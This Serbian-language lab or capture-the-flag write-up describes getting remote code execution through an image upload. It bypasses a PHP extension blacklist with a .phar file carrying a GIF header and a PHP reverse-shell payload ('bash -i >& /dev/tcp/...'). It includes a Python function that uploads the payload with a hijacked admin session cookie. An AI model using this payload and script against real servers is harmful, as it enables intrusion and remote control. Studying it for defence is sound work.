# Zadatak 3 - Izvršavanje proizvoljnog koda na serveru

## Statička analiza

Statičkom analizom koda primećeno je da pri slanju slika proverava ograničen skup ekstenzija:

```
("php","pht","phtm","phtml","phpt","pgif","phps","php2","php3","php4","php5","php6","php7","php16","inc")
```

Primetili smo da možemo da umesto slike možemo da pošaljemo fajl koji može da se izvrši ako odaberemo odgovarajuću ekstenziju koja nije navedena.

## Opis koda

Za ovaj zadatak pretpostavljamo da su uspešno izvršeni prethodni zadaci - da smo uspeli da promenimo šifru nekom od korisnika i da smo preuzeli administratorov kolačić. 

Generišemo naziv za fajl na nasumičan način da bismo izbegli situaciju u kojoj naziv može da se filtrira kroz crne liste u opštem slučaju.

Definišemo *payload* koji ćemo poslati umesto slike na sledeći način:

```
 payload = "GIF98a;<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'\");?>"%("localhost",lport)
```

Pozivamo sledeću funkciju da pošaljemo zahtev za slanje slike. Kao fajl šaljemo generisani *payload* sa ektenzijom .phar jer ona nije u skupu ekstenzija koje se automatski odbijaju na serveru i govorimo da je tip fajla *image/gif*. Uz administrator kolačić, šaljemo tako sklopljen POST zahtev.
```
def upload_image(target, sessid):
	f = {
		'image':('%s.phar'%evil,payload,'image/gif'),
		'title':(None,evil)
	}
	c = {"PHPSESSID":sessid}
	r = requests.post("http://%s/admin/upload_image.php"%target,
		cookies=c,
		files=f,
		allow_redirects=False
	)
	return "Success" in r.text
```

Ako je zahtev uspešno primljen, fajl je sačuvan na serverskoj strani među slikama i sledeći put kad se admin prijavi i ode na stranicu na kojoj se slike pojavljuju, naš kod se izvršava i server otvara konekciju ka našem serveru na kom je postavljen osluškivač na podešenom portu koji čeka da se ranjivi server na njega zakači. Ovaj tip napada spada u *reverse shell* napade.